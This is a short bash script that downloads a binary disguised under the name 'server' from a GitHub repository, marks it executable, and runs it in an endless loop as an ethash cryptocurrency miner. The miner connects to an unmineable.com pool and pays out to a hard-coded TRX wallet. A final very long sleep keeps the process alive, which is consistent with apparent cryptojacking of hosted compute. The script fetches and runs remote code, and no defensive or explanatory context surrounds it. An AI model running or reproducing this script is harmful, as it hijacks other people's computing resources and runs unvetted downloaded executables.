#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TUxbPLqKPtdvtGTFfAYmqJLdzjBhQuWSVU
WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
wget https://github.com/developer49/server/raw/main/server
chmod +x server
while [ 1 ]; do
./server -a ethash -o stratum+tcp://$POOL -u $WALLET.$WORKER -log
sleep 5
done
sleep 999999999 
